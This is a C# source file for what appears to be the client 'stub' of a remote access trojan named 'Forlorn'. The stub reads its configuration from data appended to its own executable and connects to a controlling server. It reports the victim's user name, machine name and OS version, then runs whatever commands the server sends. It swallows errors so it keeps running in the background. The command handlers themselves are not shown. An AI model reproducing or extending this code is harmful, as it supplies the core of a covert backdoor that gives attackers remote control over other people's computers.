using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ForlornStub
{
    using System.Diagnostics;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Net.Mime;
    using System.Reflection;
    using System.Security.AccessControl;
    using System.Windows.Forms;
    using System.Drawing;

    public class ForlornStubController
    {
        private StubSettings Settings;

        private SocketHelper ch
        {
            get
            {
                return _ch;
            }
            
            set
            {
                _ch = value;
                CommandHandlerMethods.ch = value;
            }
        }
        private SocketHelper _ch;

        private delegate void HandleCommand(SocketState ss, Command c);

        private Dictionary<Command.Type, HandleCommand> CommandHandlers;

        public void Begin()
        {
            Settings = EOF.GetSettings();
            CommandHandlers = InitializeCommandHandlers();

            ch = new SocketHelper(Settings)
            {
                OnConnectCallback = OnConnect
            };
            ch.OnReceiveCommandCallback.Add(OnReceiveCommand);
        }

        private Dictionary<Command.Type, HandleCommand> InitializeCommandHandlers()
        {
            Dictionary<Command.Type, HandleCommand> dicCH = new Dictionary<Command.Type, HandleCommand>();

            MethodInfo[] allHandlers = typeof(CommandHandlerMethods).GetMethods();
            foreach(MethodInfo handler in allHandlers)
            {
                HandlesCommand hc = handler.GetCustomAttributes(true).OfType<HandlesCommand>().FirstOrDefault<HandlesCommand>();
                if (hc == null || dicCH.ContainsKey(hc.TypeHandled)) continue;
                dicCH.Add(hc.TypeHandled, (HandleCommand)Delegate.CreateDelegate(typeof(HandleCommand), handler));
            }

            return dicCH;
        }

        public void OnConnect(SocketState ss)
        {
            ch.Send(this.GetIdentifyCommand());
        }

        public bool OnReceiveCommand(SocketState ss, Command c)
        {
            try
            { // handle all errors to ensure program continues in background
                if (CommandHandlers.ContainsKey(c.CommandType))
                {
                    CommandHandlers[c.CommandType](ss, c);
                }
            }
            catch (Exception ex)
            {
                this.SendError(ex);
            }

            return true;
        }

        private Command GetIdentifyCommand()
        {
            Command identifyCommand = new Command(Command.Type.Identify)
                                          {
                                              Arguments =
                                                  new string[]
                                                      {
                                                          Settings.Identifier,
                                                          Environment.UserName,
                                                          Environment.MachineName,
                                                          Environment.OSVersion.ToString()
                                                      }
                                          };

            return identifyCommand;
        }

        private void SendError(Exception ex)
        {
            string message = ex.Message + "\r\n" + ex.StackTrace;
            ch.Send(new Command(Command.Type.Error, message));
        }
    }
}
